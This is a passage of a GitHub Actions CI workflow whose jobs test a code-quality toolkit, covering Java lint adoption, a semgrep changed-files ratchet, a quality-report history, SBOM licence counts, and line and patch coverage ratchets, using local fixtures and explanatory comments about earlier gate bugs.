          </project>
          POM
          printf 'package demo;\n\npublic final class App {\n    private App() {}\n\n    public static int len(String s) {\n        return s.length();\n    }\n}\n' \
            > /tmp/consumer-java/src/main/java/demo/App.java
          ./scripts/adopt.sh /tmp/consumer-java --no-workflow
          (cd /tmp/consumer-java && mvn -B --no-transfer-progress compile)
          # ...and it must GATE, not merely build. A null dereference is the
          # NullAway path specifically, which is the half that only works if
          # ${project.groupId} resolved to something the sources live under.
          printf 'package demo;\n\npublic final class Boom {\n    private Boom() {}\n\n    static int boom() {\n        String s = null;\n        return s.length();\n    }\n}\n' \
            > /tmp/consumer-java/src/main/java/demo/Boom.java
          rc=0; out=$(cd /tmp/consumer-java && mvn -B --no-transfer-progress compile 2>&1) || rc=$?
          echo "$out"
          [[ $rc -ne 0 ]] || { echo '::error::adopted repo did NOT gate on a null dereference'; exit 1; }
          grep -q '\[NullAway\]' <<<"$out" || {
            echo '::error::the adopted repo failed, but not on NullAway — AnnotatedPackages did not resolve to the source package, which is the silent failure configs/java warns about'
            exit 1; }
          echo 'OK: adopted project builds clean code and gates a null dereference'
      - name: Java adoption is idempotent, and refuses rather than clobbering
        shell: bash
        run: |
          set -Eeuo pipefail
          before=$(sha256sum /tmp/consumer-java/pom.xml | cut -d' ' -f1)
          ./scripts/adopt.sh /tmp/consumer-java --no-workflow > /tmp/java-rerun.log 2>&1
          after=$(sha256sum /tmp/consumer-java/pom.xml | cut -d' ' -f1)
          [[ "$before" == "$after" ]] || {
            echo '::error::re-run modified pom.xml — the managed region is not idempotent, which makes every baseline bump a diff nobody asked for'; exit 1; }
          n=$(grep -c 'maxi-quality:begin' /tmp/consumer-java/pom.xml)
          [[ "$n" -eq 1 ]] || { echo "::error::the lint region was written $n times"; exit 1; }
          # A pom that already configures maven-compiler-plugin: REFUSE and say
          # why, never merge. Two declarations of one plugin in one POM is
          # last-one-wins, so writing ours would silently delete a -Werror the
          # consumer already had — the exact downgrade #10 warns about.
          rm -rf /tmp/consumer-java-own
          mkdir -p /tmp/consumer-java-own/src/main/java/demo
          cat > /tmp/consumer-java-own/pom.xml <<'POM'
          <?xml version="1.0" encoding="UTF-8"?>
          <project xmlns="http://maven.apache.org/POM/4.0.0">
            <modelVersion>4.0.0</modelVersion>
            <groupId>demo</groupId>
            <artifactId>own</artifactId>
            <version>1.0</version>
            <build>
              <plugins>
                <plugin>
                  <groupId>org.apache.maven.plugins</groupId>
                  <artifactId>maven-compiler-plugin</artifactId>
                  <configuration>
                    <compilerArgs>
                      <arg>-Xlint:all,-processing,-serial</arg>
                      <arg>-Werror</arg>
                    </compilerArgs>
                  </configuration>
                </plugin>
              </plugins>
            </build>
          </project>
          POM
          out=$(./scripts/adopt.sh /tmp/consumer-java-own --no-workflow 2>&1)
          echo "$out"
          grep -q 'already configures maven-compiler-plugin' <<<"$out" || {
            echo '::error::adopt.sh did not warn about an existing maven-compiler-plugin declaration'; exit 1; }
          if grep -q 'maxi-quality:begin' /tmp/consumer-java-own/pom.xml; then
            echo '::error::adopt.sh wrote its region into a pom that already declares the compiler plugin — the consumer just lost their own compilerArgs'
            exit 1
          fi
          grep -q '\-Werror' /tmp/consumer-java-own/pom.xml || {
            echo '::error::the consumer -Werror floor is gone from the pom'; exit 1; }
          echo 'OK: re-run is idempotent, and an existing compiler-plugin declaration is refused intact'

  # The ratchet (`--changed-only`) had NO test, and shipped broken: semgrep's
  # --baseline-commit resolves the ref against the git repo of its WORKING
  # DIRECTORY, and scan.sh never cd'd into the target. It diffed the wrong
  # repository, reported zero findings, and printed "Scan was limited to files
  # changed since baseline commit" while checking nothing — a permanently green
  # gate for any consumer adopting with the ratchet.
  #
  # Asserting BOTH directions is the point. "0 findings" alone was exactly the
  # broken behaviour, so a test that only checked grandfathering would have
  # passed against the bug.
  ratchet:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7
      - name: changed-only must grandfather old findings AND catch new ones
        shell: bash
        run: |
          set -Eeuo pipefail
          R=/tmp/ratchet-fixture
          rm -rf "$R" && mkdir -p "$R"
          git -C "$R" init -q
          git -C "$R" config user.email t@example.com
          git -C "$R" config user.name test

          # Baseline commit: one PRE-EXISTING violation.
          printf 'export function a() { return new Date(); }\n' > "$R/old.ts"
          git -C "$R" add -A
          git -C "$R" commit -qm baseline
          BASE=$(git -C "$R" rev-parse HEAD)

          # Sanity: a full scan sees the pre-existing violation. Without this,
          # a fixture that simply never matched would satisfy the test below.
          # --no-fail makes scan.sh exit 0 regardless, so no rc capture is needed.
          out=$(./scripts/scan.sh "$R" --no-fail 2>&1) || true
          grep -q 'no-ambient-clock' <<<"$out" || {
            echo '::error::fixture is inert — full scan found no violation, so the ratchet assertions prove nothing'
            exit 1
          }

          # Direction 1: nothing new -> the old finding must be grandfathered.
          out=$(./scripts/scan.sh "$R" --changed-only "$BASE" --no-fail 2>&1) || true
          if grep -qE 'Findings: [1-9]' <<<"$out"; then
            echo "$out"
            echo '::error::ratchet reported a finding with no new code — grandfathering is broken'
            exit 1
          fi

          # Direction 2: a NEW violation must fire. This is the half that was broken.
          printf 'export function b() { return new Date(); }\n' > "$R/new.ts"
          git -C "$R" add -A
          git -C "$R" commit -qm 'new violation'
          out=$(./scripts/scan.sh "$R" --changed-only "$BASE" --no-fail 2>&1) || true
          echo "$out"
          if ! grep -q 'Findings: 1 ' <<<"$out"; then
            echo '::error::ratchet did NOT report exactly 1 new finding — --changed-only is a no-op gate again'
            exit 1
          fi
          grep -q 'new.ts' <<<"$out" || {
            echo '::error::the reported finding is not the new one'; exit 1; }
          echo 'OK: ratchet grandfathers old findings and catches new ones'

  # The report issue's body IS the persistence layer, so the read-back path is
  # the whole feature. If parsing the previous body silently returns nothing,
  # every run looks fine and history resets to one row forever — a data-loss
  # bug that presents as a working report.
  quality-report:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7
      - name: Report must accumulate history, not reset it
        shell: bash
        run: |
          set -Eeuo pipefail
          F=/tmp/findings.json
          cat > "$F" <<'JSON'
          {"results":[
            {"check_id":"a.b.no-ambient-clock"},
            {"check_id":"a.b.no-ambient-clock"},
            {"check_id":"a.b.debug-print-left-behind-ts"}
          ]}
          JSON
          # An array, NOT ${2:+--previous-body "$2"} — that collapses into a
          # single argv token and argparse rejects the lot.
          gen() {
            local -a a=(--json "$F" --date "$1" --target demo/repo
                        --gitleaks clean --osv clean)
            [[ -n "${2:-}" ]] && a+=(--previous-body "$2")
            python3 scripts/quality-report.py "${a[@]}"
          }

          gen 2026-01-01            > /tmp/b1.md
          gen 2026-01-08 /tmp/b1.md > /tmp/b2.md
          gen 2026-01-15 /tmp/b2.md > /tmp/b3.md

          grep -q '| 3 |' /tmp/b1.md || grep -q '\*\*3\*\*' /tmp/b1.md || {
            echo '::error::total finding count missing from the report'; exit 1; }

          # Assert the FULL ordering, not the count and the top row.
          #
          # Checking only those two is what let a real ordering bug ship: the
          # table renders newest-first, so the rows are read back in reverse
          # chronological order, and treating that list as chronological
          # scrambled everything in the middle. Three runs rendered
          # 15, 01, 08 — correct count, correct top row, wrong table. Caught by
          # the acceptance canary, not by this job.
          dates() { grep -oE '^\| [0-9]{4}-[0-9]{2}-[0-9]{2}' "$1" | tr -d '| ' | tr '\n' ' '; }
          expect() {
            local got; got="$(dates "$1")"
            if [[ "$got" != "$2 " ]]; then
              echo "::error::history is [$got], expected [$2 ] — $3"
              sed -n '/## History/,$p' "$1"
              exit 1
            fi
          }
          expect /tmp/b3.md '2026-01-15 2026-01-08 2026-01-01' \
                 'rows must be newest-first in full, not just at the top'

          # A second run on the same day must REPLACE that day's row. The
          # history is a daily series; the canary runs on both push and
          # pull_request and produced two identical rows.
          gen 2026-01-15 /tmp/b3.md > /tmp/b3b.md
          expect /tmp/b3b.md '2026-01-15 2026-01-08 2026-01-01' \
                 'a same-day rerun appended a duplicate row instead of replacing it'

          # And a row arriving out of order still sorts into place.
          gen 2026-01-05 /tmp/b3b.md > /tmp/b3c.md
          expect /tmp/b3c.md '2026-01-15 2026-01-08 2026-01-05 2026-01-01' \
                 'an out-of-order date was appended rather than sorted'

          # A body it cannot parse must not silently wipe history.
          echo 'garbage, no history heading' > /tmp/junk.md
          gen 2026-02-01 /tmp/junk.md > /tmp/b4.md
          grep -q '2026-02-01' /tmp/b4.md || {
            echo '::error::report failed on an unparseable previous body'; exit 1; }
          echo 'OK: history accumulates, stays newest-first, survives a junk body'

      - name: Dependency table must read all three CycloneDX licence spellings
        shell: bash
        run: |
          set -Eeuo pipefail
          out=$(python3 scripts/quality-report.py --json /tmp/findings.json \
                  --date 2026-03-01 --sbom samples/sbom/cyclonedx.json)
          echo "$out"
          grep -q '^6 resolved components' <<<"$out" || {
            echo '::error::component count wrong'; exit 1; }
          # id AND name spellings must fold into one MIT row; the expression and
          # the two licence-less components must survive as their own rows.
          # The `.` stands in for the backtick the report wraps each licence in
          # — a literal backtick inside single quotes trips SC2016 and this file
          # is linted by the same actionlint it ships.
          row() {
            grep -qE "^\| .$1. \| $2 \|$" <<<"$out" || {
              echo "::error::$3"; exit 1; }
          }
          row 'MIT'               2 'license.id + license.name did not both count as MIT'
          row 'Apache-2.0'        1 'Apache-2.0 row missing'
          row 'MIT OR Apache-2.0' 1 'the SPDX expression form was dropped'
          row 'UNKNOWN'           2 'licence-less components were not counted as UNKNOWN'

          # A broken SBOM must cost the dependency table and NOTHING else. The
          # history is the irreplaceable part; a re-runnable inventory is not.
          echo 'not json at all' > /tmp/bad-sbom.json
          out=$(python3 scripts/quality-report.py --json /tmp/findings.json \
                  --date 2026-03-02 --sbom /tmp/bad-sbom.json --previous-body /tmp/b3.md)
          # An `if`, not `grep -q ... && { exit 1; }`: this step runs under
          # `set -e`, where the && form aborts precisely when grep finds
          # nothing — i.e. on the PASSING path. The SC2015 trap.
          if grep -q '## Dependencies' <<<"$out"; then
            echo '::error::a malformed SBOM produced a dependency section anyway'
            exit 1
          fi
          n=$(grep -cE '^\| 2026-0[0-9]-[0-9]{2} \|' <<<"$out" || true)
          [[ "$n" -eq 4 ]] || {
            echo "::error::a malformed SBOM cost the report its history ($n rows, expected 4)"; exit 1; }
          echo 'OK: dependency table parses every licence shape and fails soft'

      - name: An errored scan must render as ERRORED, never as zero findings
        shell: bash
        run: |
          set -uo pipefail
          # The body comes back on stdout and the exit code comes back through
          # the command substitution — `rc` set INSIDE the function would be set
          # in the subshell the substitution creates and lost on the way out.
          gen() {  # gen <json> <date> [previous-body]  -> body on stdout
            local -a a=(--json "$1" --date "$2" --target demo/repo)
            if [[ -n "${3:-}" ]]; then a+=(--previous-body "$3"); fi
            python3 scripts/quality-report.py "${a[@]}" 2>/tmp/report.err
          }

          # Semgrep reports a rule that failed to load as results:[] with the
          # reason in .errors. Reading only .results rendered "0 findings" and
          # wrote a 0 into the permanent history — an outage recorded as the
          # best week the repo ever had.
          cat > /tmp/errored.json <<'JSON'
          {"results": [], "errors": [{"type": "PartialParsing", "message": "rule x failed to parse"}],
           "paths": {"scanned": ["a.ts"]}}
          JSON
          rc=0; body=$(gen /tmp/errored.json 2026-04-01 /tmp/b3.md) || rc=$?
          [[ "$rc" == "2" ]] || { echo "::error::an errored scan exited $rc, expected 2"; exit 1; }
          grep -q 'ERRORED' <<<"$body" || {
            echo '::error::an errored scan did not render as ERRORED'; echo "$body"; exit 1; }
          if grep -qE '^\| Semgrep \| \*\*0\*\* findings \|$' <<<"$body"; then
            echo '::error::an errored scan still rendered as 0 findings'; exit 1
          fi
          grep -qE '^\| 2026-04-01 \| ERRORED \|' <<<"$body" || {
            echo '::error::the history row for an errored run is not marked ERRORED'
            sed -n '/## History/,$p' <<<"$body"; exit 1; }

          # The outage must not cost the history either — that table is the only
          # store there is.
          n=$(grep -cE '^\| 2026-0[0-9]-[0-9]{2} \|' <<<"$body")
          [[ "$n" -eq 4 ]] || { echo "::error::history lost rows on an errored run ($n, expected 4)"; exit 1; }

          # A scan that ran to completion over nothing is the same failure with
          # a different shape: it knows it looked at no files.
          cat > /tmp/nofiles.json <<'JSON'
          {"results": [], "errors": [], "paths": {"scanned": []}}
          JSON
          rc=0; body=$(gen /tmp/nofiles.json 2026-04-02) || rc=$?
          [[ "$rc" == "2" ]] || { echo "::error::a scan of 0 files exited $rc, expected 2"; exit 1; }
          grep -q 'ERRORED' <<<"$body" || { echo '::error::a 0-file scan did not render as ERRORED'; exit 1; }

          # A genuinely clean scan must still be clean — the point is to tell
          # the two apart, not to call everything broken.
          cat > /tmp/clean.json <<'JSON'
          {"results": [], "errors": [], "paths": {"scanned": ["a.ts", "b.ts"]}}
          JSON
          rc=0; body=$(gen /tmp/clean.json 2026-04-03) || rc=$?
          [[ "$rc" == "0" ]] || { echo "::error::a clean scan exited $rc, expected 0"; exit 1; }
          grep -q 'No Semgrep findings' <<<"$body" || {
            echo '::error::a clean scan no longer renders as clean'; echo "$body"; exit 1; }

          # And an unreadable results file must print NOTHING, so the caller's
          # `-s` guard stops it overwriting the standing issue with a blank.
          echo 'not json' > /tmp/broken.json
          rc=0; body=$(gen /tmp/broken.json 2026-04-04) || rc=$?
          [[ "$rc" == "3" ]] || { echo "::error::an unreadable results file exited $rc, expected 3"; exit 1; }
          [[ -z "$body" ]] || { echo '::error::a body was printed for an unreadable results file'; exit 1; }
          echo 'OK: errored, empty, clean and unreadable scans are four different things'

  # The coverage ratchet, asserted in BOTH directions and on every parse path.
  #
  # The failure mode that matters is not "it reported the wrong percentage", it
  # is "it reported a percentage at all when it should have refused". A coverage
  # run that produced nothing must never read as 100%, and a floor file that
  # cannot be parsed must never read as "no floor yet" — both turn the ratchet
  # into a permanently green step, which is the shape of every gate bug this
  # repo has actually hit.
  coverage-ratchet:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7
      - name: Both report formats must parse to the documented numbers
        shell: bash
        run: |
          set -uo pipefail
          cov() { python3 scripts/coverage.py "$@" 2>/dev/null | sed -n 's/^coverage=//p'; }
          F=/tmp/none.json

          # lcov 13/20 = 65.00 · cobertura 30/40 = 75.00 · both = 43/60 = 71.67
          got=$(cov --report samples/coverage/lcov.info --floor-file "$F")
          [[ "$got" == "65.00" ]] || { echo "::error::lcov parsed as $got, expected 65.00"; exit 1; }
          got=$(cov --report samples/coverage/cobertura.xml --floor-file "$F")
          [[ "$got" == "75.00" ]] || { echo "::error::cobertura parsed as $got, expected 75.00"; exit 1; }
          got=$(cov --report samples/coverage/lcov.info --report samples/coverage/cobertura.xml --floor-file "$F")
          [[ "$got" == "71.67" ]] || { echo "::error::merged reports parsed as $got, expected 71.67"; exit 1; }

          # The fallback paths: no LF:/LH: summary, and no lines-valid attribute.
          got=$(cov --report samples/coverage/lcov-no-summary.info --floor-file "$F")
          [[ "$got" == "40.00" ]] || { echo "::error::DA-only lcov parsed as $got, expected 40.00"; exit 1; }
          got=$(cov --report samples/coverage/cobertura-no-summary.xml --floor-file "$F")
          [[ "$got" == "66.67" ]] || { echo "::error::attribute-less cobertura parsed as $got, expected 66.67"; exit 1; }

          # cobertura.xml lists the SAME file under two <class> entries. If this
          # ever reports 66.67 (4 of 6 <line> elements) instead of 75.00, the
          # script started counting elements and coverlet multi-type files will
          # silently drift.
          echo 'OK: lcov + cobertura, summary and fallback paths, all exact'

      - name: A drop must fail, a rise must never lower the floor
        shell: bash
        run: |
          set -uo pipefail
          F=/tmp/floor.json
          run() { python3 scripts/coverage.py --floor-file "$F" "$@" >/dev/null 2>&1; echo $?; }

          rm -f "$F"
          [[ "$(run --report samples/coverage/cobertura.xml --write)" == "0" ]] || {
            echo '::error::first run should record a floor, not fail'; exit 1; }
          grep -q '75' "$F" || { echo "::error::floor not written"; cat "$F"; exit 1; }

          [[ "$(run --report samples/coverage/lcov.info)" == "1" ]] || {
            echo '::error::65% against a 75% floor did NOT fail — the ratchet does not ratchet'; exit 1; }

          # ...and the failed run must not have quietly moved the floor down to
          # match. A ratchet that lowers itself on failure is a no-op with extra
          # steps.
          [[ "$(run --report samples/coverage/lcov.info --write)" == "1" ]] || {
            echo '::error::--write turned a drop into a pass'; exit 1; }
          grep -q '75' "$F" || { echo '::error::--write LOWERED the floor on a drop'; cat "$F"; exit 1; }

          [[ "$(run --report samples/coverage/cobertura.xml)" == "0" ]] || {
            echo '::error::holding at the floor should pass'; exit 1; }

          echo '{"line": 50.0}' > "$F"
          [[ "$(run --report samples/coverage/cobertura.xml)" == "0" ]] || {
            echo '::error::a rise should pass'; exit 1; }
          grep -q '50' "$F" || { echo '::error::the floor moved WITHOUT --write'; exit 1; }
          [[ "$(run --report samples/coverage/cobertura.xml --write)" == "0" ]] || {
            echo '::error::--write on a rise should pass'; exit 1; }
          grep -q '75' "$F" || { echo '::error::--write did not raise the floor'; cat "$F"; exit 1; }
          echo 'OK: drops fail, rises pass, the floor only ever goes up'

      - name: Broken inputs must ERROR, never pass silently
        shell: bash
        run: |
          set -uo pipefail
          F=/tmp/floor2.json
          run() { python3 scripts/coverage.py --floor-file "$F" "$@" >/dev/null 2>&1; echo $?; }

          # 0 measurable lines is a broken coverage run. Reporting it as 100%
          # would raise the floor to 100 and brick the repo's gate forever.
          rm -f "$F"
          printf 'TN:\nSF:x\nLF:0\nLH:0\nend_of_record\n' > /tmp/zero.info
          [[ "$(run --report /tmp/zero.info --write)" == "3" ]] || {
            echo '::error::a zero-line report was accepted'; exit 1; }
          if [[ -f "$F" ]]; then
            echo '::error::a broken run still wrote a floor'; exit 1
          fi

          [[ "$(run --report /does/not/exist.info)" == "3" ]] || {
            echo '::error::a missing report did not error'; exit 1; }

          # A corrupt floor must NOT be treated as "no floor yet" — that
          # restarts the ratchet at whatever today happens to be.
          echo 'garbage' > "$F"
          [[ "$(run --report samples/coverage/cobertura.xml)" == "3" ]] || {
            echo '::error::a corrupt floor file was treated as a fresh start'; exit 1; }
          echo 'OK: broken inputs error out instead of going green'

      - name: No floor at all must be an error, and must never be reported as one
        shell: bash
        run: |
          set -uo pipefail
          F=/tmp/floor3.json
          run() { python3 scripts/coverage.py --floor-file "$F" "$@" >/dev/null 2>&1; echo $?; }
          rm -f "$F"

          # The state every consumer was left in: the action defaults
          # raise:false and the README snippet did not override it, so no floor
          # was ever written and every run compared against nothing. 65% against
          # nothing exited 0 with status=ok, forever.
          [[ "$(run --report samples/coverage/lcov.info --require-floor)" == "3" ]] || {
            echo '::error::--require-floor accepted a run with no floor'; exit 1; }

          # ...and the refusal must not have invented one on the way out.
          if [[ -f "$F" ]]; then
            echo '::error::a refused run wrote a floor file'; exit 1
          fi

          # Recording it is still one deliberate run.
          [[ "$(run --report samples/coverage/lcov.info --require-floor --write)" == "0" ]] || {
            echo '::error::--write did not record the first floor'; exit 1; }
          grep -q '65' "$F" || { echo '::error::the first floor is wrong'; cat "$F"; exit 1; }

          # `floor=` reported the MEASURED value when there was no floor, so
          # "compared against nothing" and "met its floor exactly" rendered
          # identically — in the one output that exists to tell them apart.
          rm -f "$F"
          got=$(python3 scripts/coverage.py --report samples/coverage/lcov.info \
                  --floor-file "$F" 2>/dev/null | sed -n 's/^floor=//p')
          [[ "$got" == "none" ]] || {
            echo "::error::no floor reported as floor=$got, expected floor=none"; exit 1; }
          echo 'OK: a missing floor errors, records on demand, and never reports itself as met'

  # scripts/coverage.py was tested directly and the composite action wrapped
  # around it was tested by nothing — so the action's OWN glob expansion had no
  # coverage, which is where the documented `**` pattern silently matched one
  # directory level and could never reach coverlet's TestResults/[guid]/ output.
  #
  # This job runs the real action, the way the layer2 job runs the real layer2.
  coverage-action:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7

      # 1. The documented default — no floor file, raise unset — used to pass at
      #    any coverage at all.
      - id: nofloor
        uses: ./actions/coverage
        continue-on-error: true
        with:
          report: samples/coverage/lcov.info
          floor-file: /tmp/nofloor.json
      - name: A run with no floor must fail rather than pass against nothing
        shell: bash
        env:
          OUTCOME: ${{ steps.nofloor.outcome }}
        run: |
          set -Eeuo pipefail
          if [[ "$OUTCOME" != 'failure' ]]; then
            echo '::error::the action passed with no floor file — the ratchet compares against nothing'
            exit 1
          fi
          if [[ -f /tmp/nofloor.json ]]; then
            echo '::error::a refused run still wrote a floor'; exit 1
          fi
          echo 'OK: no floor is an error, not a green step'

      # 2. The pattern from the README, against coverlet's real directory shape.
      #    Without globstar this step reports "no coverage report matched" and
      #    the job stops here.
      - id: nested
        uses: ./actions/coverage
        with:
          report: samples/coverage/**/coverage.cobertura.xml
          floor-file: /tmp/floor.json
          raise: 'true'
      - name: The nested report must be found and its floor recorded
        shell: bash
        env:
          COVERAGE: ${{ steps.nested.outputs.coverage }}
          FLOOR: ${{ steps.nested.outputs.floor }}
          RAISED: ${{ steps.nested.outputs.raised }}
        run: |
          set -Eeuo pipefail
          [[ "$COVERAGE" == '55.00' ]] || {
            echo "::error::the nested cobertura measured $COVERAGE, expected 55.00 — the glob matched something else"; exit 1; }
          [[ "$RAISED" == 'true' ]] || { echo '::error::the first run did not record a floor'; exit 1; }
          [[ "$FLOOR" == '55.00' ]] || {
            echo "::error::floor reported as $FLOOR after recording 55.00"; exit 1; }
          grep -q '55' /tmp/floor.json || { echo '::error::floor file wrong'; cat /tmp/floor.json; exit 1; }
          echo 'OK: ** reached TestResults/[guid]/ and the floor was recorded'

      # 3. And the ratchet ratchets THROUGH the action, not just in the script.
      - id: drop
        uses: ./actions/coverage
        continue-on-error: true
        with:
          report: samples/coverage/lcov-no-summary.info
          floor-file: /tmp/floor.json
      - name: A drop must fail the action
        shell: bash
        env:
          OUTCOME: ${{ steps.drop.outcome }}
        run: |
          set -Eeuo pipefail
          if [[ "$OUTCOME" != 'failure' ]]; then
            echo '::error::40% against a 55% floor passed — the action swallows the exit code'
            exit 1
          fi
          echo 'OK: the action propagates a drop'

      # 4. A pattern that matches nothing is a test step that produced nothing,
      #    which must never read as a passing gate.
      - id: nomatch
        uses: ./actions/coverage
        continue-on-error: true
        with:
          report: samples/coverage/**/no-such-report.xml
          floor-file: /tmp/floor.json
      - name: An unmatched pattern must fail
        shell: bash
        env:
          OUTCOME: ${{ steps.nomatch.outcome }}
        run: |
          set -Eeuo pipefail
          if [[ "$OUTCOME" != 'failure' ]]; then
            echo '::error::a pattern matching no report passed'
            exit 1
          fi
          echo 'OK: a missing report is an error'

  # Patch coverage — the number the aggregate ratchet cannot see (#112, #123).
  #
  # samples/coverage/patch is a change that adds an entirely untested function
  # to a well-covered repo. This job asserts that the aggregate ratchet PASSES
  # it. That reads backwards and is the point: a fixture that failed the
  # aggregate would prove nothing about changed lines, and the first way this
  # evidence rots is somebody "fixing" the fixture until the ratchet goes red.
  #
  # It also runs the pinned diff-cover against the identical input. Two
  # independent implementations agreeing with a hand-count is what
  # docs/EVAL-vs-diff-cover.md rests on, and a decision recorded from a run
  # nobody repeats is a claim, not evidence.
  patch-coverage:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7

      - name: Both implementations, both formats, against the hand-count
        shell: bash
        run: scripts/patch-coverage-demo.sh

      - name: The defect itself — a green aggregate over 0.00% changed lines
        shell: bash
        run: |
          set -uo pipefail
          F=samples/coverage/patch/floor.json

          for report in lcov.info cobertura.xml; do
            out=$(python3 scripts/coverage.py --report "samples/coverage/patch/$report" \
                    --floor-file "$F" --diff-file samples/coverage/patch/changed.diff 2>/dev/null)
            rc=$?
            [[ "$rc" == "0" ]] || {
              echo "::error::the ratchet exited $rc on $report — the fixture must PASS the aggregate"; exit 1; }
            # status=ok and coverage=94.95 are the step above's job — it runs
            # first in this job and stops it dead. What is asserted here is the
            # machine-readable half the demo does not read: the exact keys the
            # composite action will hand to $GITHUB_OUTPUT.
            grep -qx 'patch_coverage=0.00' <<<"$out" || {
              echo "::error::$report reported the wrong patch number"; echo "$out"; exit 1; }
            grep -qx 'patch_lines_found=4' <<<"$out" || {
              echo "::error::$report measured the wrong number of changed lines"; echo "$out"; exit 1; }
          done
          echo 'OK: the aggregate is green, the four lines it added are untested, both formats say so'

      - name: Nothing measurable is n/a — never 0%, never 100%
        shell: bash
        run: |
          set -uo pipefail
          F=samples/coverage/patch/floor.json
          patch() {
            python3 scripts/coverage.py --report samples/coverage/patch/lcov.info \
              --floor-file "$F" --diff-file "$1" 2>/dev/null | sed -n 's/^patch_coverage=//p'
          }

          # A docs-only change, and a change that added nothing at all. Both
          # have zero measurable added lines, and a percentage is not an answer
          # to a question with no denominator: 0% gates on something no test can
          # fix, 100% gates on a lie. Either one gets the gate switched off.
          for diff in samples/coverage/patch/docs-only.diff /dev/null; do
            got=$(patch "$diff")
            [[ "$got" == "n/a" ]] || {
              echo "::error::$diff reported patch_coverage=$got, expected n/a"; exit 1; }
          done

          # And the covered case still computes, so `n/a` is not just what this
          # script always says.
          got=$(patch samples/coverage/patch/partial.diff)
          [[ "$got" == "33.33" ]] || {
            echo "::error::the partially-covered diff reported $got, expected 33.33"; exit 1; }
          echo 'OK: no denominator is n/a, and a real denominator still divides'

      - name: A diff that cannot be parsed is an error, not a passing gate
        shell: bash
        run: |
          set -uo pipefail
          run() {
            python3 scripts/coverage.py --report samples/coverage/patch/lcov.info \
              --floor-file samples/coverage/patch/floor.json --diff-file "$1" >/dev/null 2>&1
            echo $?
          }

          [[ "$(run /does/not/exist.diff)" == "3" ]] || {
            echo '::error::a missing diff did not error'; exit 1; }

          printf '+++ b/x.ts\n@@ this is not a hunk header @@\n+const a = 1;\n' > /tmp/bad.diff
          [[ "$(run /tmp/bad.diff)" == "3" ]] || {
            echo '::error::an unparseable hunk header was accepted — every added line would silently vanish'; exit 1; }

          # A hunk holding fewer lines than it declared is a truncated diff. Its
          # missing added lines would otherwise be counted as "not added at
          # all", which reads as a smaller denominator and a better score.
          printf '+++ b/x.ts\n@@ -1,2 +1,9 @@\n+const a = 1;\n' > /tmp/short.diff
          [[ "$(run /tmp/short.diff)" == "3" ]] || {
            echo '::error::a hunk shorter than its header was accepted'; exit 1; }

          # And the ambiguity that makes the hunk lengths necessary: a change
          # adding a line that begins with `++` emits `+++ x`, which is a file
          # header by prefix and an added line by position. Both of these lines
          # are line 62-63 of the fixture, which the report measures at 0 hits.
          {
            printf 'diff --git a/samples/coverage/patch/src/rollup.ts b/samples/coverage/patch/src/rollup.ts\n'
            printf -- '--- a/samples/coverage/patch/src/rollup.ts\n+++ b/samples/coverage/patch/src/rollup.ts\n'
            printf '@@ -62,2 +62,4 @@\n+++ marker\n+const x = 1;\n'
            printf ' export function medianAbsoluteDeviation(values: readonly number[]): number {\n'
            printf '   const middle = percentile(values, 50);\n'
          } > /tmp/plusplus.diff
          got=$(python3 scripts/coverage.py --report samples/coverage/patch/lcov.info \
                  --floor-file samples/coverage/patch/floor.json \
                  --diff-file /tmp/plusplus.diff 2>/dev/null | sed -n 's/^patch_lines_found=//p')
          [[ "$got" == "2" ]] || {
            echo "::error::a diff adding a ++ line measured $got added lines, expected 2"; exit 1; }
          echo 'OK: an unreadable diff errors instead of reporting a number for it'

      - name: The ratchet output is unchanged when no diff is passed
        shell: bash
        run: |
          set -Eeuo pipefail
          # The composite action parses this stdout into $GITHUB_OUTPUT. Every
          # consumer on @v1 runs without --diff-file, and must see exactly what
          # it saw before patch coverage existed.
          out=$(python3 scripts/coverage.py --report samples/coverage/patch/lcov.info \
                  --floor-file samples/coverage/patch/floor.json 2>/dev/null)
          if grep -q '^patch_' <<<"$out"; then
            echo '::error::patch_* outputs appeared without --diff-file'; echo "$out"; exit 1
          fi
          diff <(printf 'coverage=94.95\nfloor=95.00\nlines_hit=7600\nlines_found=8004\nraised=false\nstatus=ok\n') \
               <(printf '%s\n' "$out") || {
            echo '::error::the ratchet output changed shape'; exit 1; }
          echo 'OK: without --diff-file the output is byte-for-byte what it was'

      # ---- the gate (#127) -------------------------------------------------
      #
      # Everything above MEASURES. These assert that the number now FAILS a run,
      # and — the part that matters more — that it fails only when it should.
      - name: The bar decides, and the boundary passes
        shell: bash
        run: |
          set -uo pipefail
          F=samples/coverage/patch
          rc() {
            python3 scripts/coverage.py --report $F/lcov.info \
              --floor-file $F/floor.json "$@" >/dev/null 2>&1; echo $?
          }
          want() { # description, expected-rc, args...
            d="$1"; e="$2"; shift 2
            got=$(rc "$@")
            [[ "$got" == "$e" ]] || {
              echo "::error::$d — exit $got, expected $e"; exit 1; }
          }

          # 0 of 4 covered. The defect, now red.
          want '0% at the default bar'   1 --diff-file $F/changed.diff  --patch-threshold 50
          # 2 of 6 = 33.33%.
          want '33% at the default bar'  1 --diff-file $F/partial.diff  --patch-threshold 50
          # 3 of 4 = 75.00%. Above the default, below 80.
          want '75% at the default bar'  0 --diff-file $F/majority.diff --patch-threshold 50
          want '75% at an 80 bar'        1 --diff-file $F/majority.diff --patch-threshold 80
          # Exactly at the bar passes: >=, not >. If this ever flips, a repo
          # sitting precisely on its threshold goes red for no reason it can fix.
          want '75% at a 75 bar'         0 --diff-file $F/majority.diff --patch-threshold 75
          # 0 keeps the measurement and switches the gate off.
          want '0% with the gate off'    0 --diff-file $F/changed.diff  --patch-threshold 0
          # Nothing measurable added: not 0%, not 100%, not a failure.
          want 'docs-only at a bar'      0 --diff-file $F/docs-only.diff --patch-threshold 50
          want 'empty diff at a bar'     0 --diff-file /dev/null         --patch-threshold 50
          # A bar with no diff would pass everything while looking like a gate.
          want 'a bar with no diff'      3 --patch-threshold 50
          echo 'OK: the bar fires below it, holds at it, and never fires on n/a'

      - name: A red patch gate has to say which lines to test
        shell: bash
        run: |
          set -uo pipefail
          F=samples/coverage/patch
